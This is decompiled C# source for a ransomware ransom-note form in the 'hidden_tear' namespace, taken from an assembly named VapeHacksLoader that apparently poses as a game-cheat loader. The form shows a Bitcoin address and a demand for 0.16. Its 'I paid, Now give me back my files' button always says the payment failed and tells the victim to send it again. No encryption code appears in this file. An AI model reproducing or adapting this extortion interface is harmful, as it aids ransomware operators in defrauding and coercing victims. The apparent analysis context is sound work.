// Decompiled with JetBrains decompiler
// Type: hidden_tear.Form3
// Assembly: VapeHacksLoader, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 630DF1DB-C121-457B-BCEC-9948B868FD96
// Assembly location: C:\Users\user\volal\dumps\executable.3720.exe

using hidden_tear.Properties;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace hidden_tear
{
  public class Form3 : Form
  {
    private IContainer components = (IContainer) null;
    private PictureBox pictureBox1;
    private TextBox textBox1;
    private Label label1;
    private Button button1;

    public Form3() => this.InitializeComponent();

    private void textBox1_TextChanged(object sender, EventArgs e)
    {
    }

    private void button1_Click(object sender, EventArgs e)
    {
      int num1 = (int) MessageBox.Show("Checking Payment.................Please Wait", "Please wait");
      int num2 = (int) MessageBox.Show("Your Payment has failed, The funs have been sent back to your wallet. Please send it again", "Error");
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.pictureBox1 = new PictureBox();
      this.textBox1 = new TextBox();
      this.label1 = new Label();
      this.button1 = new Button();
      ((ISupportInitialize) this.pictureBox1).BeginInit();
      this.SuspendLayout();
      this.pictureBox1.Image = (Image) Resources.Bitcoin_Accepted_Here_4800px;
      this.pictureBox1.Location = new Point(142, 359);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(512, 146);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox1.TabIndex = 0;
      this.pictureBox1.TabStop = false;
      this.textBox1.BackColor = Color.Black;
      this.textBox1.Font = new Font("Microsoft Sans Serif", 10.2f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.textBox1.ForeColor = Color.Red;
      this.textBox1.Location = new Point(142, 282);
      this.textBox1.Name = "textBox1";
      this.textBox1.ReadOnly = true;
      this.textBox1.Size = new Size(512, 27);
      this.textBox1.TabIndex = 1;
      this.textBox1.Text = "1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M";
      this.textBox1.TextChanged += new EventHandler(this.textBox1_TextChanged);
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Microsoft Sans Serif", 10.8f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label1.ForeColor = Color.Red;
      this.label1.Location = new Point(259, 196);
      this.label1.Name = "label1";
      this.label1.Size = new Size(279, 24);
      this.label1.TabIndex = 2;
      this.label1.Text = "Send 0.16 to the address below.";
      this.button1.BackColor = Color.Black;
      this.button1.Font = new Font("Microsoft Sans Serif", 10.8f);
      this.button1.ForeColor = Color.Red;
      this.button1.Location = new Point(263, 86);
      this.button1.Name = "button1";
      this.button1.Size = new Size(275, 75);
      this.button1.TabIndex = 3;
      this.button1.Text = "I paid, Now give me back my files.";
      this.button1.UseVisualStyleBackColor = false;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.AutoScaleDimensions = new SizeF(8f, 16f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.Black;
      this.ClientSize = new Size(797, 536);
      this.Controls.Add((Control) this.button1);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.textBox1);
      this.Controls.Add((Control) this.pictureBox1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form3);
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
